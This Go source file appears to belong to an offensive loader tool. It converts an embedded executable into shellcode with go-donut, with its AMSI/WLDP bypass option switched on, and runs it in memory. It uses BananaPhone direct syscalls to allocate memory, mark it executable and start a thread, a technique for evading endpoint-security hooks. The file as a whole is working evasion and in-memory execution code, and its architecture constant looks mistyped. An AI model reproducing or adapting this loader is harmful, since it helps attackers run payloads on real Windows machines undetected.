package controllers

import (
	"bytes"
	"fmt"
	"syscall"
	"time"
	"unsafe"

	"github.com/Binject/go-donut/donut"
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

func checkFatalErr(err error) {
	if err != nil {
		panic(err)
	}
}

func PrintEmbeddedFiles() {
	_, children_files := listEmbeddedFiles()
	for _, value := range children_files {
		fmt.Println(value)
	}
}

func RunEmbeddedBinary(binary string, arguments string) {
	binaryBytes := readEmbeddedBinary(binary)
	argumentBinary := " " // trick use empty argument if no one is given
	if arguments != "" {
		argumentBinary = arguments
	}

	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(binaryBytes), &donut.DonutConfig{
		Arch:       donut.X84,
		Type:       donut.DONUT_MODULE_EXE,
		InstType:   donut.DONUT_INSTANCE_PIC,
		Entropy:    donut.DONUT_ENTROPY_DEFAULT,
		Compress:   1,
		Format:     1,
		Bypass:     3,
		Parameters: argumentBinary,
	})

	bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	checkFatalErr(err)

	alloc, err := bp.GetSysID("NtAllocateVirtualMemory")
	checkFatalErr(err)
	protect, err := bp.GetSysID("NtProtectVirtualMemory")
	checkFatalErr(err)
	createthread, err := bp.GetSysID("NtCreateThreadEx")
	checkFatalErr(err)

	// create thread on shellcode
	const (
		//special macro that says 'use this thread/process' when provided as a handle.
		thisThread = uintptr(0xffffffffffffffff)
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode.Bytes()))
	_, err = bananaphone.Syscall(
		alloc, //ntallocatevirtualmemory
		thisThread,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	checkFatalErr(err)

	bananaphone.WriteMemory(shellcode.Bytes(), baseA)

	var oldprotect uintptr
	_, err = bananaphone.Syscall(
		protect, //NtProtectVirtualMemory
		thisThread,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	checkFatalErr(err)

	var hhosthread uintptr
	_, err = bananaphone.Syscall(
		createthread,                         //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		thisThread,                           //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)

	_, err = syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	checkFatalErr(err)

	// bit of a hack because dunno how to wait for bananaphone background thread to complete...
	for {
		time.Sleep(1000000000)
	}
}
